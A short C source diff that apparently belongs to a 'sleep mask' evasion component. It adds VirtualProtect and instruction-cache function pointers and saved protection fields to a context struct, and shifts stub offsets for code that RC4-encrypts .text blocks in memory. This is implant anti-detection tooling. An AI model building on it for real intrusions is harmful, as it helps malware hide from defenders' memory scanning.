@@ -84,7 +84,11 @@ typedef struct {
 	int             text_idx;             /* +0x48 .text block index          */
 	BW_USTRING      u_text;               /* +0x50                            */
 	BW_USTRING      u_key;                /* +0x60  (Buffer -> ctx->key)      */
-	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];
+	unsigned long   vp_old;               /* +0x70 VirtualProtect old-prov bin */
+	unsigned long   text_prot;            /* +0x74 .text original protection  */
+	BOOL (WINAPI  * pVirtualProtect)(void *, SIZE_T, DWORD, DWORD *); /* +0x78 */
+	BOOL (WINAPI  * pFlushIC)(void *, const void *, SIZE_T);          /* +0x80 */
+	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0x88 */
 } BW_CTX;
 
 volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */
@@ -97,8 +101,9 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 #define BW_STATE_CLOSED 2
 
 #define BW_ENTER_OFF 0x000
-#define BW_EXIT_OFF  0x040
-#define BW_WATCH_OFF 0x080
+#define BW_EXIT_OFF  0x050
+#define BW_WATCH_OFF 0x0A0
+#define BW_CTXQ_OFF  0x110   /* after the watchdog tail-jump data qword */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
